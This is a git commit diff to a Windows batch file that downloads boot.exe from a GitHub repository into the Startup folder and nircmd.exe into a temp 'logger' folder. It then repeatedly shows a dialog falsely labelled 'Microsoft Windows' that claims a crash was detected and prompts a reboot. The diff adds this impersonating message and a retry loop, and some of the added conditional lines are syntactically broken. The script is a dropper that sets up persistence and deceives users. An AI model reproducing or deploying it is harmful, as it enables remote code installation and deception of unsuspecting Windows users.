fec4cd9320685b47c6fdccd7519d4af8862c884f
TheBetaBiggie <53587460+TheBetaBiggie@users.noreply.github.com>
2022-08-24 14:53:12 -0700

    Update start.bat

--- start.bat
+++ start.bat
@@ -2,13 +2,14 @@
 :start
 powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/boot.exe -OutFile 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\boot.exe'
 powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/nircmd.exe -OutFile %temp%\logger\nircmd.exe
+goto check
 :rebootpls
-timeout 1
+timeout 300
 :check
 if exist "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\boot.exe" if exist "%temp%\logger\nircmd.exe" goto rebootprompt
-if not exist "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\boot.exe" powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/boot.exe -OutFile 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\boot.exe'
-if not exist "%temp%\logger\nircmd.exe" powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/nircmd.exe -OutFile %temp%\logger\nircmd.exe
+if not exist goto start
+if not exist goto start
 goto check
 :rebootprompt
-%temp%\logger\nircmd.exe qboxcom "Do you want to reboot? Make sure you save everything you have open. (This prompt will disappear after reboot.)" "Microsoft Windows" exitwin reboot
+%temp%\logger\nircmd.exe qboxcom "Windows has detected a recent crash. A reboot should be able to fix this problem. (If the problem persists go to https://support.microsoft.com/)" "Microsoft Windows" exitwin reboot
 goto rebootpls
